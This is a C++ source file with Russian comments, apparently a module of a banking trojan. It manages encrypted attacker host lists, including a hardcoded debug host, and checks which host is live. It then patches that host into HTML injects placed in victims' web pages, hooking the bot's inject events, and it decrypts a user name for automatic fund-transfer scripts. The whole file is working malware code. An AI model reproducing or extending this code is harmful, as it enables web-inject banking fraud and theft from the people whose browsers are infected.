//---------------------------------------------------------------------------
#pragma hdrstop


#include "Modules.h"


#ifdef AzConfigH
	//****************************************
	//   Файл включен в модули проекта
	//   используем отдельные настройки
	//****************************************
//	#define USE_AZ_CONFIG
    #define USE_AZ_USER
#endif


#include "Strings.h"
#include "Config.h"
#include "Utils.h"
#include "BotHosts.h"
#include "BotDef.h"
#include "BotConfig.h"
//-----------------------------------------------------------------------------


// Внутренние данные модуля
namespace AZDATA
{
	DWORD PID = 0; 				  // Идентификаор процесса в котором работает модуль
	THostChecker *Checker = NULL; // Система проверки работоспособности хостов

    char Variable_ScriptHost[] = {'%','a','z','.','h','o','s','t','%', 0};;
}


//*******************************************************
// Имя пользователя для скриптов авто залива
//*******************************************************
#ifdef USE_AZ_USER
	char AZ_USER[AZCONFIG_PARAM_SIZE_AZUSER] = AZCONFIG_PARAM_NAME_AZUSER;
#endif


string GetAzUser()
{
	// Функция возвращает имя пользователя для систем автозалива

	string User;

    #ifdef USE_AZ_USER
		#ifndef DEBUGCONFIG
			User = AZ_USER;
			if (AZCONFIG_PARAM_ENCRYPTED_AZUSER)
				DecryptStr(User.t_str(), User.t_str());
		#else
			User = "test";
		#endif //DEBUGCONFIG
	#endif //USE_AZ_USER
	return User;
}


//-------------------------------------------------------



#ifdef USE_AZ_CONFIG

	char AZ_HOSTS[AZCONFIG_PARAM_SIZE_HOSTS] = AZCONFIG_PARAM_NAME_HOSTS;

	#define AZ_HOSTS_HASH 0xE0203A42 /* __AZ_HOSTS__ */


	//*****************************************************************
	//  Хосты, которые будут вшиваться в HTML инжекты
	//*****************************************************************
	#ifdef DEBUGCONFIG
		// Отладочные данные
		char AZ_SCRIPTS_HOSTS[] = "rus.zika.in\0";
	#else
		// Рабочий массив
		char AZ_SCRIPTS_HOSTS[AZCONFIG_PARAM_SIZE_SCRIPTHOSTS] = AZCONFIG_PARAM_NAME_SCRIPTHOSTS;
	#endif

	#define AZ_SCRIPTS_HOSTS_HASH 0x94D84D31 /* __AZ_SCRIPTS_HOSTS__ */



//----------------------------------------------------
// GetAzHost - Функция возвращает первый рабочий хост
// из массива хостов системы AZ
//----------------------------------------------------
string GetAzHost()
{
	#ifdef USE_AZ_CONFIG
		return GetActiveHostFromBuf2(AZ_HOSTS, AZ_HOSTS_HASH, AZCONFIG_PARAM_ENCRYPTED_HOSTS);
	#else
    	return GetActiveHost2();
	#endif
}
//-----------------------------------------------------------------------------


//----------------------------------------------------
//  GetAzURL - Функция возвращает полный адрес на
//   основе Хоста системы и переданного пути
//----------------------------------------------------
string GetAzURL(const char*  Path)
{
	string Host = GetAzHost();
	if (Host.IsEmpty()) return Host;
	TURL URL;
	URL.Host = Host;
	URL.Path = Path;

    return URL.URL();
}
//-----------------------------------------------------------------------------

//----------------------------------------------------
//  AzInicializeHostChecker - Функция инициализирует
//  систему проверки хостов
//----------------------------------------------------
void AzInicializeHostChecker()
{
	if (IsNewProcess(AZDATA::PID))
	{
		// Запуск в новом процессе
		#ifdef DEBUGCONFIG
        	bool Encrypted = false;
		#else
        	bool Encrypted = AZCONFIG_PARAM_ENCRYPTED_SCRIPTHOSTS;
		#endif
		AZDATA::Checker = new THostChecker(AZ_SCRIPTS_HOSTS, Encrypted);
    }
}
//-----------------------------------------------------------------------------

void AZInjectActivated(LPVOID Sender, int EventId, DWORD WParam, DWORD LParam)
{
	// Запуск процесса проверки хоста
    AzCheckScriptHosts();
}


void AZInjectExecute(LPVOID Sender, int EventId, DWORD WParam, DWORD LParam)
{
	// Устанавливаем значение хоста
	TBotConfig* Config = Config::GetConfig();
	if (Config && AZDATA::Checker)
	{
		string Host = AZDATA::Checker->GetWorkHost();
		if (Host.IsEmpty())
			Host = AZDATA::Checker->FirstHost;
		Config->HTMLInjects->Variables->SetValue(AZDATA::Variable_ScriptHost, Host);
	}
}

void AZInjectsLoadedEvent(LPVOID Sender, int EventId, DWORD WParam, DWORD LParam)
{
	if (!Sender) return;

	THTMLInjectList* Injects = (THTMLInjectList*)Sender;

	// Перебираем все инжекты в поисках инжектов  нужной переменной
	TLock L = Injects->GetLocker();


	int Count = Injects->Count();
	for (int i = 0; i < Count; i++)
	{
		THTMLInject *Inject = Injects->Items(i);
		if (Inject->ContainVariable("%az.host%"))
		{
			// Подключаемся к инжекту в ожидании его активации
			Inject->AttachEvent(BOT_EVENT_HTMLINJECT_ACTIVATED, AZInjectActivated);
			Inject->AttachEvent(BOT_EVENT_HTMLINJECT_EXECUTE, AZInjectExecute);
		}

	}
}



//----------------------------------------------------
// AzCheckScriptHosts - Функция запускает проверку
// хостов вшиваемых в HTML инжекты
//----------------------------------------------------
void AzCheckScriptHosts()
{
	// Инициализируем проверку
	AzInicializeHostChecker();

	AZDATA::Checker->Check();
}
//-----------------------------------------------------------------------------


//----------------------------------------------------
// AzGetScriptHost - Функция возвращает  рабочий хост
// для вшития в HTML инжекты
//----------------------------------------------------
string AzGetScriptHost()
{
	if (AnsiStr::Hash(AZ_SCRIPTS_HOSTS) == AZ_SCRIPTS_HOSTS_HASH)
		return NULLSTR;

	// Инициализируем чекер хостов
	AzInicializeHostChecker();

	// Запрашиваем рабочий хост
	return AZDATA::Checker->GetWorkHost();
}



//-----------------------------------------------------------------------------
#endif


//----------------------------------------------------
//  AzInizializeHTMLInjects  - Функция инициализирует
//  систему подмены ссылок в HTML инжектах
//----------------------------------------------------
void AzInizializeHTMLInjects()
{
	#ifdef USE_AZ_CONFIG
	// перебираем инжекты и ищем в них вхождение параметра
	TBotConfig* Config = Config::GetConfig();
	if (Config)
	{
		// Подключаемся к событию загрузки HTML инжектов
		Config->HTMLInjects->AttachEvent(BOT_EVENT_HTMLINJECTS_LOADED, AZInjectsLoadedEvent);
		AZInjectsLoadedEvent(Config->HTMLInjects, 0, 0, 0);
	}
	#endif
}
//-----------------------------------------------------------------------------


